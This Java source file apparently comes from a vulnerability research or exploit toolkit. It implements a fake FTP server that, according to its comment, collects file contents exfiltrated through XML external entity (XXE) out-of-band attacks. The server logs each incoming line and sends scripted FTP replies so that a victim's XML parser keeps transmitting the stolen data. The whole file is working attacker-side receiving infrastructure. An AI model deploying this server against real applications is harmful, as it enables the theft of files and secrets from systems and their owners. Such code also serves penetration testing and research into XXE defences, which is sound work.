package com.threedr3am.bug.common.server;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * 用于xxe oob多行文件内容时使用，参考xxe-ftp-server.rb
 * 链接：https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb
 *
 * @author xuanyh
 */
public class FtpServer {

  private static final int PORT = 2121;

  private static ExecutorService executorService = Executors.newFixedThreadPool(4);

  public static void main(String[] args) {
    try {
      ServerSocket serverSocket = new ServerSocket(PORT);
      for (;;) {
        Socket socket = serverSocket.accept();
        executorService.execute(() -> {
          try {
            handle(socket.getInputStream(), socket.getOutputStream());
            socket.close();
          } catch (IOException e) {
            e.printStackTrace();
          }
        });
      }

    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  private static void handle(InputStream inputStream, OutputStream outputStream) {
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    PrintWriter printWriter = new PrintWriter(outputStream, true);
    System.out.println("FTP. New client connected");
    printWriter.println("220 xxe-ftp-server");
    for (;;) {
      String line = null;
      try {
        line = bufferedReader.readLine();
        System.out.println("< " + line);
      } catch (IOException e) {
        e.printStackTrace();
        System.out.println("FTP. Connection closed");
        break;
      }
      if (line.toUpperCase().contains("LIST")) {
        printWriter.println("drwxrwxrwx 1 owner group          1 Feb 21 04:37 test");
        printWriter.println("150 Opening BINARY mode data connection for /bin/ls");
        printWriter.println("226 Transfer complete.");
      } else if (line.toUpperCase().contains("USER")) {
        printWriter.println("331 password please - version check");
      } else if (line.toUpperCase().contains("PORT")) {
        System.out.println("! PORT received");
        System.out.println("> 200 PORT command ok");
        printWriter.println("200 PORT command ok");
      } else {
        System.out.println("> 230 more data please!");
        printWriter.println("230 more data please!");
      }
    }
  }
}
